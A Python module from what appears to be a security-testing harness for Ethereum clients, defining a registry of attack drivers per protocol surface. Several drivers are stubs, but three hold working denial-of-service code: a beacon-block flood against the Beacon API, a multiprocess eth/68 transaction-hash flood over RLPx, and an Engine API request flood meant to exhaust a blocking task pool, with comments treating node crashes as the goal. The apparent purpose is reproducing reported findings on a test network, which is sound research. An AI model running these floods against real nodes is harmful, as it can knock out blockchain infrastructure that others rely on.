"""L1 attack-driver contract + registry.

One driver per attack surface, reused across all clients (the input is a
protocol message, which doesn't care what language the client is written in).
Drivers are the only part of the live path that is surface-specific; each is
parameterised entirely by a FindingSpec.

The concrete network implementations need a live devnet target, so they are
stubs here: they declare their surface and generators and raise a clear
``DriverNotImplemented`` when asked to emit. That keeps the contract testable
offline (every finding must map to a registered driver) without pretending the
network side works.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Protocol, runtime_checkable

from ..schema import AttackSurface, FindingSpec


class DriverNotImplemented(NotImplementedError):
    """Raised when a stub driver's live network path is invoked."""


def make_engine_jwt(secret: bytes) -> str:
    """HS256 JWT for the Engine API (a single ``iat`` claim, per the spec)."""
    import base64
    import hashlib
    import hmac
    import json
    import time

    def b64(b: bytes) -> bytes:
        return base64.urlsafe_b64encode(b).rstrip(b"=")

    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64(json.dumps({"iat": int(time.time())}, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = b64(hmac.new(secret, signing_input, hashlib.sha256).digest())
    return (signing_input + b"." + sig).decode()


@dataclass
class DriverTarget:
    """Where the driver sends its traffic (filled in by the devnet layer)."""

    enode_or_multiaddr: str = ""
    rpc_url: str = ""
    engine_url: str = ""
    jwt_secret: str = ""


@runtime_checkable
class AttackDriver(Protocol):
    surface: AttackSurface
    generators: tuple[str, ...]

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Drive the attack described by ``spec`` against ``target``.

        Returns the number of attack units delivered.
        """
        ...


class _StubDriver:
    """Base for drivers whose payload construction works offline but whose
    network send needs a live devnet."""

    surface: AttackSurface
    generators: tuple[str, ...] = ()

    def build_payload(self, spec: FindingSpec):
        """Construct (but do not send) the attack payload — pure, offline."""
        from .payloads import build_payload

        return build_payload(spec.attacker_input.generator, spec.attacker_input.params)

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        # Payload construction is real; only the network send is pending.
        self.build_payload(spec)
        raise DriverNotImplemented(
            f"{self.surface.value} driver (generator={spec.attacker_input.generator!r}) "
            f"builds its payload but needs a live devnet target to send it"
        )


class RlpxDriver(_StubDriver):
    surface = AttackSurface.P2P_RLPX
    generators = ("oversized_frame_body_length",)


class WireDriver(_StubDriver):
    surface = AttackSurface.DEVP2P_WIRE
    generators = ("newblockhashes_flood",)


class GossipDriver(_StubDriver):
    surface = AttackSurface.P2P_GOSSIP
    generators = ("far_future_slot_beacon_block_flood",)

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Flood far-future-slot BeaconBlocks at the CL's Beacon API.

        Uses the HTTP path from the grandine PoC (POST /eth/v1/beacon/blocks).
        Returns blocks delivered; stops early if the connection drops (OOM).

        LIVE NOTE (2026-06-27, grandine 1.x / Electra devnet): this API path was
        falsified as a repro of PROP-val-eth-003 — the node deserializes and
        version-validates the block (400 before any buffering), so it never
        reaches validate_gossip_rules / delayed_until_slot. A faithful repro
        needs the real libp2p gossipsub path. See reports/findings_index.json
        live_probe. The emit is kept (correct for Beacon-API-delivered floods)
        but is not the right vector for the delayed_until_slot finding.
        """
        import struct
        import urllib.error
        import urllib.request

        from .payloads import _encode_signed_block

        if not target.rpc_url:
            raise DriverNotImplemented("gossip driver needs target.rpc_url (beacon API base)")

        params = spec.attacker_input.params
        count = int(params.get("count", 1000))
        slot = int(params.get("current_slot", 1000)) + int(params.get("slot_offset", 1_000_000))
        url = target.rpc_url.rstrip("/") + "/eth/v1/beacon/blocks"

        sent = 0
        for i in range(count):
            body = _encode_signed_block(slot, struct.pack("<I", i).ljust(32, b"\x00"))
            req = urllib.request.Request(
                url, data=body, method="POST",
                headers={"Content-Type": "application/octet-stream"},
            )
            try:
                urllib.request.urlopen(req, timeout=5).read()
            except urllib.error.HTTPError:
                # 400/415 etc: node rejects the payload but the finding is that
                # it still buffers the future-slot block before validation.
                pass
            except (urllib.error.URLError, ConnectionError, OSError):
                # connection refused -> node likely crashed (OOM) = the symptom.
                break
            sent += 1
        return sent


class TxpoolDriver(_StubDriver):
    surface = AttackSurface.TXPOOL
    generators = ("newpooledtxhashes_hash_flood",)

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Flood eth/68 NewPooledTransactionHashes at a real reth node.

        The driver keeps the wire payload compressible so snappy does not
        become the limiting factor. Each announcement message uses a distinct
        hash seed so reth cannot trivially deduplicate repeated sends.
        """
        import multiprocessing as mp
        import re
        import time

        from . import wire
        from .payloads import _compressible_unique_txhash
        from .rlpx.session import ETH_NEW_POOLED_TX_HASHES, Session

        if not target.enode_or_multiaddr:
            raise DriverNotImplemented("txpool driver needs target.enode_or_multiaddr")

        params = spec.attacker_input.params
        hashes_per_msg = int(params.get("count", 450_000))
        workers = int(params.get("workers", 8))
        duration = float(params.get("duration", 30))
        batch_sleep_ms = float(params.get("batch_sleep_ms", 10))
        start_timeout = float(params.get("start_timeout", 60))

        stop = mp.Event()
        start = mp.Event()
        ready = mp.Value("i", 0)
        total_sent = mp.Value("q", 0)

        def _worker(index: int) -> None:
            m = re.match(r"(?:enode://)?([0-9a-fA-F]+)@[^:]+:(\d+)", target.enode_or_multiaddr)
            if not m:
                raise DriverNotImplemented(
                    f"txpool driver needs a reachable enode, got {target.enode_or_multiaddr!r}"
                )
            pub_hex, port_s = m.groups()
            port = int(port_s)
            pub = bytes.fromhex(pub_hex)
            s = Session("127.0.0.1", port, pub)
            s.handshake(timeout=15)
            payload_seed = index * hashes_per_msg
            hashes = [
                _compressible_unique_txhash(payload_seed + i)
                for i in range(hashes_per_msg)
            ]
            body = wire.encode_new_pooled_transaction_hashes_68(hashes)
            with ready.get_lock():
                ready.value += 1
            if not start.wait(timeout=start_timeout):
                s.close()
                return
            deadline = time.time() + duration
            sent = 0
            while not stop.is_set() and time.time() < deadline:
                try:
                    s.write_msg(ETH_NEW_POOLED_TX_HASHES, body)
                    sent += hashes_per_msg
                except Exception:
                    break
                try:
                    s.sock.settimeout(0.01)
                    while True:
                        s.sock.recv(65536)
                except Exception:
                    pass
                if batch_sleep_ms > 0:
                    time.sleep(batch_sleep_ms / 1000.0)
            with total_sent.get_lock():
                total_sent.value += sent
            s.close()

        procs = [mp.Process(target=_worker, args=(i,)) for i in range(workers)]
        for proc in procs:
            proc.start()

        deadline = time.time() + start_timeout
        while time.time() < deadline:
            if ready.value >= workers:
                break
            time.sleep(0.1)
        start.set()
        time.sleep(duration)
        stop.set()
        for proc in procs:
            proc.join(timeout=10)
        return int(total_sent.value)


class EngineDriver(_StubDriver):
    surface = AttackSurface.ENGINE_API
    generators = ("blocking_task_flood",)

    def emit(self, spec: FindingSpec, target: DriverTarget) -> int:
        """Flood a JWT-authenticated Engine API method with an abusive range.

        For RETH-ENG-004: repeated engine_getPayloadBodiesByRangeV1 with a huge
        count ties up the blocking task pool. Needs only JWT + JSON-RPC — no
        valid block construction — so it is the most tractable live repro.
        Returns requests delivered; stops early if the connection drops.
        """
        import json
        import urllib.error
        import urllib.request

        if not target.engine_url or not target.jwt_secret:
            raise DriverNotImplemented("engine driver needs target.engine_url + jwt_secret")

        secret = bytes.fromhex(target.jwt_secret.removeprefix("0x"))
        params = spec.attacker_input.params
        count = int(params.get("count", 100))
        method = params.get("method", "engine_getPayloadBodiesByRangeV1")
        rpc_params = params.get("rpc_params", ["0x1", "0xffffffffffffffff"])
        body = json.dumps(
            {"jsonrpc": "2.0", "method": method, "params": rpc_params, "id": 1}
        ).encode()

        sent = 0
        for _ in range(count):
            req = urllib.request.Request(
                target.engine_url, data=body, method="POST",
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {make_engine_jwt(secret)}",
                },
            )
            try:
                urllib.request.urlopen(req, timeout=10).read()
            except urllib.error.HTTPError:
                # the method may error on the abusive range, but the work
                # (and the blocking-pool occupancy) still happened.
                pass
            except (urllib.error.URLError, ConnectionError, OSError):
                break
            sent += 1
        return sent


class BlockImportDriver(_StubDriver):
    surface = AttackSurface.BLOCK_IMPORT
    generators = ("unfinalized_fork_block_flood",)


DRIVER_REGISTRY: dict[AttackSurface, type[_StubDriver]] = {
    d.surface: d
    for d in (
        RlpxDriver,
        WireDriver,
        GossipDriver,
        TxpoolDriver,
        EngineDriver,
        BlockImportDriver,
    )
}


def get_driver(surface: AttackSurface) -> _StubDriver:
    """Instantiate the driver registered for ``surface``."""
    try:
        return DRIVER_REGISTRY[surface]()
    except KeyError as e:
        raise KeyError(f"no driver registered for surface {surface}") from e
